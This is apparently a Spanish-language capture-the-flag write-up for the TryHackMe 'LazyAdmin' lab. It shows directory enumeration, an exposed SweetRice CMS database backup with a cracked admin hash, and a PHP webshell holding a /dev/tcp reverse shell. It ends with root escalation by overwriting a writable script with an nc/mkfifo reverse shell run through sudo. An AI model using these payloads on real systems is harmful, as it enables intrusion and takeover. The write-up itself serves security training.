# LazyAdmin - TryHackMe
**IP:** 10.10.236.150

## Enumeración
```bash
gobuster dir -u http://10.10.236.150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Encontramos `/content/` → **SweetRice CMS**.

## Foothold - backup de MySQL expuesto
```bash
wget http://10.10.236.150/content/inc/mysql_backup
```
El backup filtra el hash del admin:
```
42f749ade7f9e195bf475f37a44cafcb  →  Password123
```
Logueamos en el panel y subimos una webshell PHP:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<mi_ip>/1234 0>&1'"); ?>
```
Shell como `www-data`.

## Escalada - sudo perl + script escribible
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
`backup.pl` ejecuta `/etc/copy.sh`, que es escribible. Lo sobrescribimos con un reverse shell y disparamos:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <mi_ip> 5554 >/tmp/f' > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```
Shell root (alternativa: `echo "chmod +s /bin/bash" > /etc/copy.sh` y luego `bash -p`).
